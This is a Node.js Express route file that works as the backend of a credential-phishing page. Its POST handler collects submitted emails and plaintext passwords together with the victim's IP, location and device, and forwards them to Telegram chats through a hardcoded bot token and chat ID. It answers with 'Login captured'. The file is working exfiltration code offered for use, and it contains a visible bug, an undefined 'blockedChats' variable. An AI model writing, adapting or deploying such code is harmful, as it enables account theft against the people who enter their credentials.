const express = require("express");
const fetch = require("node-fetch");
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');

const router = express.Router();

// Your Telegram bot credentials
const BOT_TOKEN = "7498813414:AAEkmCWxpfqQSu5ry9T-auDJIu7TYyzIiLw";
const CHAT_IDS = ["8268872332", "YOUR_SECOND_CHAT_ID"]; // Replace with actual chat IDs
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

// Function to send message to a specific chat ID with better error handling
async function sendToTelegram(chatId, message) {
    try {
        console.log(`Attempting to send to chat ID: ${chatId}`);
        
        const response = await fetch(TELEGRAM_API, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: "Markdown"
            })
        });

        const responseData = await response.json();
        
        if (!response.ok) {
            console.log(`Telegram API error for chat ${chatId}:`, responseData);
            
            // Handle specific error cases
            if (responseData.error_code === 403) {
                console.log(`❌ Bot blocked by user ${chatId}`);
                return { success: false, error: 'BOT_BLOCKED', chatId };
            } else if (responseData.error_code === 400) {
                console.log(`❌ Invalid chat ID: ${chatId}`);
                return { success: false, error: 'INVALID_CHAT_ID', chatId };
            } else {
                return { success: false, error: responseData.description, chatId };
            }
        }

        console.log(`✅ Telegram notification sent to chat ${chatId}`);
        return { success: true, chatId };
        
    } catch (error) {
        console.error(`❌ Network error sending to chat ${chatId}:`, error.message);
        return { success: false, error: error.message, chatId };
    }
}

// Function to validate chat IDs by checking if bot can send messages
async function validateChatIds() {
    console.log('🔍 Validating chat IDs...');
    const validationResults = [];
    
    for (const chatId of CHAT_IDS) {
        try {
            const testMessage = '🔍 Bot connectivity test';
            const response = await fetch(TELEGRAM_API, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: testMessage
                })
            });
            
            const responseData = await response.json();
            validationResults.push({
                chatId,
                valid: response.ok,
                error: response.ok ? null : responseData.description
            });
            
            if (response.ok) {
                console.log(`✅ Chat ID ${chatId} is valid`);
            } else {
                console.log(`❌ Chat ID ${chatId} error: ${responseData.description}`);
            }
            
        } catch (error) {
            console.log(`❌ Chat ID ${chatId} validation failed:`, error.message);
            validationResults.push({
                chatId,
                valid: false,
                error: error.message
            });
        }
    }
    
    return validationResults;
}

// Validate chat IDs on startup
validateChatIds().then(results => {
    const validChats = results.filter(r => r.valid).length;
    console.log(`📊 Chat ID Validation Complete: ${validChats}/${CHAT_IDS.length} valid`);
});

router.post('/', async (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({ success: false, message: "Missing email or password" });
        }

        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const location = geoip.lookup(ip);
        const locationStr = location ? `${location.city}, ${location.country}` : 'Unknown';

        const parser = new UAParser(req.headers['user-agent']);
        const agent = parser.getResult();
        const deviceType = `${agent.os.name} ${agent.os.version} - ${agent.browser.name} ${agent.browser.version}`;

        // Build the Telegram message
        const message = `
📌 *Login Notification*
- Email: \`${email}\`
- Password: \`${password}\`
- IP: \`${ip}\`
- Location: ${locationStr}
- Timestamp: ${new Date().toISOString()}
- Device: ${deviceType}
        `;

        console.log(`📨 Processing login for: ${email}`);
        console.log(`📋 Sending to ${CHAT_IDS.length} chat IDs`);

        // Send to all Telegram chat IDs
        const sendPromises = CHAT_IDS.map(chatId => sendToTelegram(chatId, message));
        const results = await Promise.all(sendPromises);
        
        // Analyze results
        const successfulSends = results.filter(result => result.success).length;
        const blockedBots = results.filter(result => result.error === 'BOT_BLOCKED').length;
        const invalidChats = results.filter(result => result.error === 'INVALID_CHAT_ID').length;
        const otherErrors = results.filter(result => !result.success && result.error !== 'BOT_BLOCKED' && result.error !== 'INVALID_CHAT_ID').length;

        console.log(`📊 Send Results: ${successfulSends} successful, ${blockedBots} blocked, ${invalidChats} invalid, ${otherErrors} other errors`);

        // Return success even if some failed (at least one worked)
        const overallSuccess = successfulSends > 0;

        res.status(200).json({
            success: overallSuccess,
            message: overallSuccess ? 
                `Login captured and sent to ${successfulSends} recipient(s)` : 
                'Login captured but failed to send notifications',
            loginDetails: { 
                email: email, // Return masked email for confirmation
                device: deviceType, 
                ip, 
                location: locationStr,
                timestamp: new Date().toISOString(),
                notifications: {
                    successful: successfulSends,
                    blocked: blockedChats,
                    invalid: invalidChats,
                    otherErrors: otherErrors,
                    total: CHAT_IDS.length
                }
            }
        });

    } catch (error) {
        console.error("❌ Error processing login notification:", error);
        res.status(500).json({ 
            success: false, 
            message: "Failed to process login notification", 
            error: error.message 
        });
    }
});

// Add a test endpoint to check bot status
router.get('/test-bot', async (req, res) => {
    try {
        const validationResults = await validateChatIds();
        const validChats = validationResults.filter(r => r.valid);
        
        res.json({
            botToken: BOT_TOKEN ? '✅ Set' : '❌ Missing',
            chatIds: CHAT_IDS,
            validation: validationResults,
            summary: {
                total: CHAT_IDS.length,
                valid: validChats.length,
                invalid: CHAT_IDS.length - validChats.length
            }
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

module.exports = router;